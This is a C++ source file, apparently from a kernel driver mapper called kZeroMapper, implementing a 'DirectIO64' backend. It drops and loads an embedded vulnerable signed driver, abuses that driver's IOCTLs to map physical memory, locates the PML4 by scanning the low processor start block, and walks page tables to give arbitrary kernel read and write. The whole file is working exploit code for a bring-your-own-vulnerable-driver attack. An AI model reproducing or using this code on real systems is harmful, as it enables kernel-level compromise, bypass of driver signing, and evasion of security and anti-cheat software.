#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_DIRECTIO64)

#include "DirectIO64Backend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "directio64_sys.h"
#include "halamd64.h"
#include <algorithm>

std::string DirectIO64Backend::Name( ) const
{
	return pstra( "DirectIO64" );
}

NTSTATUS DirectIO64Backend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( directio64_sys, sizeof( directio64_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\DIRECTIOLPT" ), image.data( ), image.size( ), &m_Device, 0x9160 );
}

NTSTATUS DirectIO64Backend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( );
}

bool DirectIO64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, buffer, size, false );

	if ( !result )
		LOG_SEC( "[-] - [DirectIO64] ReadMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool DirectIO64Backend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, const_cast<void*>( buffer ), size, true );

	if ( !result )
		LOG_SEC( "[-] - [DirectIO64] WriteMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool DirectIO64Backend::CallDriver( ULONG ioControlCode, PVOID inputBuffer, ULONG inputLength, PVOID outputBuffer, ULONG outputLength )
{
	IO_STATUS_BLOCK ioStatus {};

	auto status = NtDeviceIoControlFile( m_Device, nullptr, nullptr, nullptr, &ioStatus, ioControlCode,
		inputBuffer, inputLength, outputBuffer, outputLength );

	if ( status == STATUS_PENDING )
		status = NtWaitForSingleObject( m_Device, FALSE, nullptr );

	SetLastError( RtlNtStatusToDosError( status ) );

	return NT_SUCCESS( status );
}

PVOID DirectIO64Backend::MapPhysicalMemory( uint64_t physicalAddress, ULONG bytes, HANDLE* sectionHandle, PVOID* allocatedMdl, BOOLEAN writable )
{
	PhysicalMemoryInfo request {};

	*sectionHandle = nullptr;
	*allocatedMdl = nullptr;

	const auto offset = physicalAddress & 0xFFFFFFFFFFFFF000;
	const auto mapSize = s_cast<ULONG>( physicalAddress - offset ) + bytes;

	request.ViewSize = mapSize;
	request.Offset.QuadPart = offset;
	request.Writeable = writable;

	if ( CallDriver( 0x80112044, &request, sizeof( request ), &request, sizeof( request ) ) )
	{
		*sectionHandle = request.SectionHandle;
		*allocatedMdl = request.AllocatedMdl;
		return request.BaseAddress;
	}

	return nullptr;
}

void DirectIO64Backend::UnmapPhysicalMemory( PVOID sectionToUnmap, HANDLE sectionHandle, PVOID allocatedMdl )
{
	PhysicalMemoryInfo request {};

	request.BaseAddress = sectionToUnmap;
	request.AllocatedMdl = allocatedMdl;
	request.SectionHandle = sectionHandle;

	CallDriver( 0x80112048, &request, sizeof( request ), &request, sizeof( request ) );
}

bool DirectIO64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, ULONG bytes, bool write )
{
	PVOID allocatedMdl = nullptr;
	HANDLE sectionHandle = nullptr;

	auto mappedSection = MapPhysicalMemory( physicalAddress, bytes, &sectionHandle, &allocatedMdl, write ? TRUE : FALSE );

	if ( !mappedSection )
	{
		LOG_SEC( "[-] - [DirectIO64] ReadWritePhysical map failed pa=0x%llx size=0x%X write=%d gle=%lu", physicalAddress, bytes, write ? 1 : 0, GetLastError( ) );
		return false;
	}

	const auto offset = physicalAddress - ( physicalAddress & 0xFFFFFFFFFFFFF000 );
	bool result = false;

	__try
	{
		if ( write )
			RtlCopyMemory( RtlOffsetToPointer( mappedSection, offset ), buffer, bytes );
		else
			RtlCopyMemory( buffer, RtlOffsetToPointer( mappedSection, offset ), bytes );

		result = true;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		LOG_SEC( "[-] - [DirectIO64] ReadWritePhysical exception pa=0x%llx size=0x%X write=%d code=0x%X", physicalAddress, bytes, write ? 1 : 0, GetExceptionCode( ) );
		result = false;
	}

	UnmapPhysicalMemory( mappedSection, sectionHandle, allocatedMdl );

	return result;
}

bool DirectIO64Backend::QueryPml4( uint64_t* value )
{
	if ( !value )
		return false;

	*value = 0;

	PVOID allocatedMdl = nullptr;
	HANDLE sectionHandle = nullptr;

	auto lowStub = r_cast<uintptr_t>( MapPhysicalMemory( 0, 0x100000, &sectionHandle, &allocatedMdl, FALSE ) );

	if ( !lowStub )
	{
		LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to map low stub gle=%lu", GetLastError( ) );
		return false;
	}

	const auto cr3Offset = FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
		FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );

	ULONG offset = 0;

	while ( offset < 0x100000 )
	{
		offset += 0x1000;

		__try
		{
			if ( 0x00000001000600E9 != ( 0xffffffffffff00ff & *r_cast<uint64_t*>( lowStub + offset ) ) )
				continue;

			if ( 0xfffff80000000000 != ( 0xfffff80000000003 & *r_cast<uint64_t*>( lowStub + offset + FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget ) ) ) )
				continue;

			if ( 0xffffff0000000fff & *r_cast<uint64_t*>( lowStub + offset + cr3Offset ) )
				continue;

			*value = *r_cast<uint64_t*>( lowStub + offset + cr3Offset );
			LOG_SEC( "[*] - [DirectIO64] QueryPml4 found pml4=0x%llx lowStubOffset=0x%X", *value, offset );
			break;
		}
		__except ( EXCEPTION_EXECUTE_HANDLER )
		{
			LOG_SEC( "[-] - [DirectIO64] QueryPml4 exception offset=0x%X code=0x%X", offset, GetExceptionCode( ) );
			*value = 0;
			break;
		}
	}

	UnmapPhysicalMemory( r_cast<PVOID>( lowStub ), sectionHandle, allocatedMdl );

	if ( !*value )
		LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to find PML4" );

	return *value != 0;
}

bool DirectIO64Backend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* physicalAddress )
{
	constexpr uint64_t EntryPresentBit = 1;
	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;

	if ( entry & EntryPresentBit )
	{
		*physicalAddress = entry & PhysicalAddressMask;
		return true;
	}

	return false;
}

bool DirectIO64Backend::VirtualToPhysical( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
	constexpr uint64_t PhysicalAddressMask2MbPages = 0x000fffffffe00000ull;
	constexpr uint64_t VirtualAddressMask2MbPages = 0x00000000001fffffull;
	constexpr uint64_t VirtualAddressMask4KbPages = 0x0000000000000fffull;
	constexpr uint64_t EntryPageSizeBit = 0x0000000000000080ull;

	uint64_t pml4 = 0;

	if ( !QueryPml4( &pml4 ) )
	{
		LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed QueryPml4 va=0x%llx", virtualAddress );
		return false;
	}

	auto table = pml4 & PhysicalAddressMask;
	uint64_t entry = 0;

	for ( int r = 0; r < 4; r++ )
	{
		const auto shift = 39 - ( r * 9 );
		const auto selector = ( virtualAddress >> shift ) & 0x1ff;

		if ( !ReadWritePhysical( table + selector * sizeof( uint64_t ), &entry, sizeof( entry ), false ) )
		{
			LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed read entry va=0x%llx level=%d table=0x%llx selector=0x%llx", virtualAddress, r, table, selector );
			return false;
		}

		if ( !PageEntryToPhysicalAddress( entry, &table ) )
		{
			LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical entry not present va=0x%llx level=%d entry=0x%llx", virtualAddress, r, entry );
			return false;
		}

		if ( r == 2 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask2MbPages;
			table += virtualAddress & VirtualAddressMask2MbPages;
			*physicalAddress = table;
			LOG_SEC( "[*] - [DirectIO64] VirtualToPhysical large-page va=0x%llx pa=0x%llx pml4=0x%llx", virtualAddress, *physicalAddress, pml4 );
			return true;
		}
	}

	table += virtualAddress & VirtualAddressMask4KbPages;
	*physicalAddress = table;

	LOG_SEC( "[*] - [DirectIO64] VirtualToPhysical va=0x%llx pa=0x%llx pml4=0x%llx", virtualAddress, *physicalAddress, pml4 );

	return true;
}

bool DirectIO64Backend::ReadWriteVirtual( uint64_t address, void* buffer, size_t size, bool write )
{
	auto bytes = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint64_t physical = 0;
		const auto currentAddress = address + offset;
		const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
		const auto chunk = s_cast<ULONG>( std::min<size_t>( pageLeft, size - offset ) );

		if ( !VirtualToPhysical( currentAddress, &physical ) )
			return false;

		if ( !ReadWritePhysical( physical, bytes + offset, chunk, write ) )
			return false;

		offset += chunk;
	}

	return true;
}




#endif // KZEROMAPPER_ENABLE_DIRECTIO64
